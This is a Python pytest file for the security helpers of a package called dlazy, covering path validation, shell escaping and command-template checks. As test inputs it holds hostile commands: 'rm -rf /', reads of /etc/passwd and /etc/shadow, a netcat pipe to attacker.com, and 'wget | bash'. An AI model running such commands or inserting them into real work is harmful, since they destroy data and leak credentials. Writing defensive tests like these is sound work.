"""安全功能测试"""

import subprocess
import pytest
from pathlib import Path
import tempfile
import os

from dlazy.security import (
    validate_path,
    sanitize_shell_arg,
    safe_format_command,
    run_command_safe,
    sanitize_filename,
    SecurityError,
)
from dlazy.config_validator import (
    validate_command_template,
    validate_global_config,
)


class TestPathValidation:
    """路径验证测试"""

    def test_valid_absolute_path(self, tmp_path):
        """测试有效的绝对路径"""
        test_file = tmp_path / "test.txt"
        test_file.write_text("test")

        result = validate_path(test_file, must_exist=True)
        assert result == test_file.resolve()

    def test_valid_relative_path(self, tmp_path):
        """测试有效的相对路径"""
        test_file = tmp_path / "test.txt"
        test_file.write_text("test")

        result = validate_path("test.txt", base_dir=tmp_path, must_exist=True)
        assert result == test_file.resolve()

    def test_path_traversal_attack(self, tmp_path):
        """测试路径遍历攻击检测"""
        with pytest.raises(SecurityError, match="路径遍历"):
            validate_path("../../../etc/passwd", base_dir=tmp_path)

    def test_symlink_not_allowed(self, tmp_path):
        """测试符号链接检测"""
        target = tmp_path / "target.txt"
        target.write_text("test")
        link = tmp_path / "link.txt"
        link.symlink_to(target)

        with pytest.raises(SecurityError, match="符号链接"):
            validate_path(link, allow_symlinks=False)

    def test_dangerous_path_patterns(self):
        """测试危险路径模式检测"""
        dangerous_paths = [
            "/etc/passwd",
            "/etc/shadow",
            "/root/.ssh/id_rsa",
        ]

        for path in dangerous_paths:
            with pytest.raises(SecurityError):
                validate_path(path)

    def test_path_outside_base_dir(self, tmp_path):
        """测试路径在基准目录外"""
        other_dir = tmp_path.parent / "other"
        other_dir.mkdir(exist_ok=True)

        with pytest.raises(SecurityError, match="不在基准目录"):
            validate_path(other_dir, base_dir=tmp_path)


class TestShellInjection:
    """Shell注入测试"""

    def test_sanitize_simple_string(self):
        """测试简单字符串转义"""
        result = sanitize_shell_arg("simple")
        assert result == "simple"

    def test_sanitize_string_with_spaces(self):
        """测试包含空格的字符串"""
        result = sanitize_shell_arg("path with spaces")
        assert result == "'path with spaces'"

    def test_sanitize_injection_attempt(self):
        """测试注入攻击防护"""
        malicious_inputs = [
            "file; rm -rf /",
            "file && cat /etc/passwd",
            "file | nc attacker.com 1234",
            "$(cat /etc/passwd)",
            "`cat /etc/passwd`",
            "file > /etc/passwd",
        ]

        for malicious in malicious_inputs:
            result = sanitize_shell_arg(malicious)
            assert "'" in result or '"' in result

    def test_safe_format_command(self):
        """测试安全命令格式化"""
        template = "echo {message}"
        result = safe_format_command(template, message="hello")
        assert result == "echo hello"

    def test_safe_format_with_injection(self):
        """测试注入攻击防护"""
        template = "cat {file}"

        result = safe_format_command(template, file="/etc/passwd; rm -rf /")

        assert "rm -rf" not in result or "'" in result

    def test_run_command_safe(self, tmp_path):
        """测试安全命令执行"""
        test_file = tmp_path / "test.txt"

        result = run_command_safe(
            "touch {file}",
            args={"file": test_file},
            cwd=tmp_path,
        )

        assert test_file.exists()

    def test_run_command_with_timeout(self):
        """测试命令超时"""
        with pytest.raises(subprocess.TimeoutExpired):
            run_command_safe("sleep 10", timeout=0.1)


class TestTemplateInjection:
    """模板注入测试"""

    def test_valid_template(self):
        """测试有效模板"""
        template = "echo {poscar} {scf}"
        assert validate_command_template(template) is True

    def test_unauthorized_placeholder(self):
        """测试未授权的占位符"""
        template = "cat {password}"

        with pytest.raises(SecurityError, match="未授权"):
            validate_command_template(template)

    def test_dangerous_command_pattern(self):
        """测试危险命令模式"""
        dangerous_templates = [
            "rm -rf {path}",
            "wget {url} | bash",
            "curl {url} > /etc/hosts",
        ]

        for template in dangerous_templates:
            with pytest.raises(SecurityError, match="危险命令"):
                validate_command_template(template)


class TestFilenameSanitization:
    """文件名清理测试"""

    def test_sanitize_normal_filename(self):
        """测试正常文件名"""
        assert sanitize_filename("file.txt") == "file.txt"

    def test_sanitize_path_traversal(self):
        """测试路径遍历字符清理"""
        assert "/" not in sanitize_filename("../../../etc/passwd")
        assert "\\" not in sanitize_filename("..\\..\\..\\windows\\system32")

    def test_sanitize_dangerous_chars(self):
        """测试危险字符清理"""
        dangerous = 'file<>:"|?*.txt'
        result = sanitize_filename(dangerous)

        for char in ["<", ">", ":", '"', "|", "?", "*"]:
            assert char not in result

    def test_sanitize_hidden_file(self):
        """测试隐藏文件名清理"""
        assert not sanitize_filename(".hidden").startswith(".")

    def test_sanitize_long_filename(self):
        """测试长文件名截断"""
        long_name = "a" * 300 + ".txt"
        result = sanitize_filename(long_name)
        assert len(result) <= 255


class TestConfigValidation:
    """配置验证测试"""

    def test_valid_config(self):
        """测试有效配置"""
        config = {"0olp": {"commands": {"create_infile": "create {poscar} {scf}"}}}

        warnings = validate_global_config(config)
        assert len(warnings) == 0

    def test_config_with_dangerous_command(self):
        """测试包含危险命令的配置"""
        config = {"0olp": {"commands": {"create_infile": "rm -rf {poscar}"}}}

        warnings = validate_global_config(config)
        assert len(warnings) > 0
        assert "危险命令" in warnings[0]

    def test_config_with_unauthorized_placeholder(self):
        """测试包含未授权占位符的配置"""
        config = {"1infer": {"commands": {"infer": "python {password}"}}}

        warnings = validate_global_config(config)
        assert len(warnings) > 0
        assert "未授权" in warnings[0]


class TestIntegrationSecurity:
    """集成安全测试"""

    def test_end_to_end_command_execution(self, tmp_path):
        """端到端命令执行测试"""
        input_file = tmp_path / "input.txt"
        input_file.write_text("test content")
        output_file = tmp_path / "output.txt"

        result = run_command_safe(
            "cp {input} {output}",
            args={
                "input": input_file,
                "output": output_file,
            },
            cwd=tmp_path,
        )

        assert output_file.exists()
        assert output_file.read_text() == "test content"

    def test_injection_prevention_in_workflow(self, tmp_path):
        """工作流注入防护测试"""
        malicious_path = tmp_path / "file; rm -rf /"

        safe_path = sanitize_shell_arg(malicious_path)

        command = f"cat {safe_path}"
        assert "rm -rf" not in command or "'" in command
